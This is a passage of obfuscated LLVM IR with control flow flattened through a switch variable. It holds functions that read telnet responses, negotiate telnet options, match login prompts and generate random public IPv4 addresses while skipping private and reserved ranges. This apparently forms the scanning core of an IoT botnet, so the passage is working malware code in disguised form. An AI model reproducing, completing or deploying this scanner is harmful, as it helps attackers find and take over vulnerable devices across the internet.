  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 317199666, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 736779042, i32 -1722011947
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -1282987353, i32 -579558819
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -1282987353, i32 -1919330969
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -1282987353, i32 -2054523515
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -1282987353, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1722011947, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 1383534771, i32 699426079
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 317199666, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 1907471825, i32 2132271637
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1337787243, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -728840855, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -588685437, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1337787243, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -1155180591, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1155180591, label %33
    i32 -2065566497, label %39
    i32 394984990, label %44
    i32 347653768, label %48
    i32 1292679952, label %49
    i32 -173116442, label %51
    i32 2131093168, label %52
    i32 619629352, label %61
    i32 -699123793, label %78
    i32 -1188662236, label %79
    i32 -1337616655, label %91
    i32 -45613593, label %95
    i32 2037368564, label %96
    i32 146578666, label %105
    i32 319860469, label %114
    i32 228960662, label %118
    i32 1325567709, label %119
    i32 -1303925830, label %128
    i32 -1598060825, label %129
    i32 -63746762, label %130
    i32 1270203432, label %136
    i32 1601289989, label %140
    i32 520455037, label %145
    i32 1509230675, label %146
    i32 1199683755, label %147
    i32 -902737402, label %148
    i32 1005999934, label %152
    i32 1105783764, label %153
    i32 -829976092, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -2065566497, i32 1292679952
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 347653768, i32 394984990
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 347653768, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1292679952, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -173116442, i32 -902737402
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 2131093168, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !4
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 619629352, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -699123793, i32 -1188662236
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -902737402, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -45613593, i32 -1337616655
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -45613593, i32 2037368564
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -829976092, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 146578666, i32 -63746762
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 228960662, i32 319860469
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 228960662, i32 1325567709
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -829976092, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 -1598060825, i32 -1303925830
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -829976092, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 1199683755, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 520455037, i32 1270203432
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 1601289989, i32 1509230675
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 520455037, i32 1509230675
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 -902737402, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 1199683755, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1155180591, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 1005999934, i32 1105783764
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 -829976092, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -829976092, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1631258566, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1631258566, label %first
    i32 754430740, label %8
    i32 -31484455, label %13
    i32 666158393, label %18
    i32 -19917814, label %23
    i32 -1113558947, label %44
    i32 1337032656, label %57
    i32 1389036408, label %62
    i32 1841345735, label %67
    i32 -1517133287, label %72
    i32 -1059175995, label %77
    i32 -1672725229, label %82
    i32 -515129744, label %87
    i32 313567776, label %92
    i32 -1481793155, label %97
    i32 1146566527, label %102
    i32 -49716537, label %107
    i32 783713216, label %112
    i32 -654049930, label %117
    i32 -1896218167, label %122
    i32 401210335, label %127
    i32 -1689192034, label %132
    i32 858715027, label %137
    i32 1119022081, label %142
    i32 -1533096978, label %147
    i32 1785965867, label %152
    i32 -61070876, label %157
    i32 1635542727, label %162
    i32 1572375779, label %167
    i32 933421531, label %172
    i32 2120627061, label %177
    i32 -2087691098, label %182
    i32 -944580405, label %187
    i32 -766816527, label %192
    i32 1041086956, label %197
    i32 2033011027, label %201
    i32 1838103202, label %203
    i32 1342072918, label %216
    i32 145778385, label %229
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp slt i32 %.reload, 255
  %7 = select i1 %6, i32 754430740, i32 -1113558947
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %10 = zext i8 %9 to i32
  %11 = icmp slt i32 %10, 255
  %12 = select i1 %11, i32 -31484455, i32 -1113558947
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %15, 255
  %17 = select i1 %16, i32 666158393, i32 -1113558947
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp slt i32 %20, 255
  %22 = select i1 %21, i32 -19917814, i32 -1113558947
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %25 = add i8 %24, 1
  store i8 %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %26 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %27 = add i8 %26, 1
  store i8 %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %28 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %29 = add i8 %28, 1
  store i8 %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %30 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %31 = add i8 %30, 1
  store i8 %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %38 = zext i8 %37 to i32
  %39 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %40 = zext i8 %39 to i32
  %41 = call i32 (i8*, i8*, ...) @szprintf(i8* %32, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %34, i32 %36, i32 %38, i32 %40)
  %42 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %43 = call i32 @inet_addr(i8* %42) #2
  store i32 %43, i32* %1, align 4
  store i32 145778385, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = call i32 @rand() #2
  %46 = srem i32 %45, 255
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %48 = call i32 @rand() #2
  %49 = srem i32 %48, 255
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %51 = call i32 @rand() #2
  %52 = srem i32 %51, 255
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %54 = call i32 @rand() #2
  %55 = srem i32 %54, 255
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  store i32 1337032656, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  %61 = select i1 %60, i32 2033011027, i32 1389036408
  store i32 %61, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  %66 = select i1 %65, i32 2033011027, i32 1841345735
  store i32 %66, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 100
  %71 = select i1 %70, i32 -1517133287, i32 -1672725229
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 64
  %76 = select i1 %75, i32 -1059175995, i32 -1672725229
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 127
  %81 = select i1 %80, i32 2033011027, i32 -1672725229
  store i32 %81, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 127
  %86 = select i1 %85, i32 2033011027, i32 -515129744
  store i32 %86, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 169
  %91 = select i1 %90, i32 313567776, i32 -1481793155
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 254
  %96 = select i1 %95, i32 2033011027, i32 -1481793155
  store i32 %96, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 172
  %101 = select i1 %100, i32 1146566527, i32 783713216
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp sle i32 %104, 16
  %106 = select i1 %105, i32 -49716537, i32 783713216
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sle i32 %109, 31
  %111 = select i1 %110, i32 2033011027, i32 783713216
  store i32 %111, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 192
  %116 = select i1 %115, i32 -654049930, i32 401210335
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 0
  %121 = select i1 %120, i32 -1896218167, i32 401210335
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 2
  %126 = select i1 %125, i32 2033011027, i32 401210335
  store i32 %126, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 192
  %131 = select i1 %130, i32 -1689192034, i32 1119022081
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 88
  %136 = select i1 %135, i32 858715027, i32 1119022081
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 99
  %141 = select i1 %140, i32 2033011027, i32 1119022081
  store i32 %141, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 192
  %146 = select i1 %145, i32 -1533096978, i32 1785965867
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 168
  %151 = select i1 %150, i32 2033011027, i32 1785965867
  store i32 %151, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 198
  %156 = select i1 %155, i32 -61070876, i32 1572375779
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 18
  %161 = select i1 %160, i32 2033011027, i32 1635542727
  store i32 %161, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %164 = zext i8 %163 to i32
